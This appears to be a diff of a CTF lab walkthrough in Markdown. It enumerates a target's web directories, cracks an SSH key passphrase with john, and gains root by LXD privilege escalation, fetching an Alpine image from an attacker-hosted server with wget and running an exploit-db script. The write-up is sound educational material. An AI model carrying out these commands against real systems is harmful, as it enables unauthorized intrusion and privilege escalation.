@@ -17,44 +17,90 @@ Basic directory enumeration
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.44.124  
 ```
 
+![gobuster](imgs/gobuster.png "gobuster")
+
+found `/secret` and `/uploads`
+
+content of `/secret`
+
+![secret](imgs/secret.png "secret")
+
+found RSA KEY
+
+content of `/uploads`
+
+![uploads](imgs/uploads.png "uploads")
+
+found some possible password list
+
+![passwdlist](imgs/passwdlist.png "passwdlist")
+
+
 user might be john as suggested by comment on the site
+
+![comm](imgs/comm.png "comm")
+
+preparing to crack the passphrase with ssh2john
 
 ```
 ssh2john secretKey > hash.txt
 ```
 
+now cracking password
+
 ```
 john --wordlist=dict.lst hash.txt
 ```
 
-found password: letmein
+![johncrack](imgs/johncrack.png "johncrack")
+
+found password: `letmein`
+
+
+
+
+Now logging as john via ssh and first flag `user.txt`
+
+```
+ssh -i secretKey john@VICTIM_IP
+```
+![userflag](imgs/userflag.png "userflag")
+
+using `linpeas.sh` to automated founding priv esc factor
 
 ```
 scp -i secretKey ~/linpeas.sh john@10.10.44.124:/tmp/
 ```
 
-download from alpine lxd from
+![linpeas](imgs/linpeas.png "linpeas")
+
+USING LXD PRIVILEGE ESCALATION
+
+download `alpine lxd` from `https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz`
+
+start python server on attacker `sudo python3 -m http-server`
+
+
+download file on victim
 ```
-https://github.com/saghul/lxd-alpine-builder/blob/master/alpine-v3.13-x86_64-20210218_0139.tar.gz
+wget ATTACKER_IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 ```
 
-start python server `sudo python3 -m http-server`
+create exploit file from `https://www.exploit-db.com/exploits/46978` on victim
 
-
-use on victim
 ```
-wget 10.11.115.41:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+nano exploit.sh
+chmod +x exploit.sh
 ```
-
-create exploit file from 
-
-`https://www.exploit-db.com/exploits/46978`
-`nano exploit.sh`
-`chmod +x exploit.sh`
 
 to gain root
 ```
 ./exploit.sh -f alpine-v3.13-x86_64-20210218_0139.tar.gz
 ```
+![root](imgs/root.png "root")
+
+getting root flag
+
+![rootflag](imgs/rootflag.png "rootflag")
 
 # MACHINE PWNED
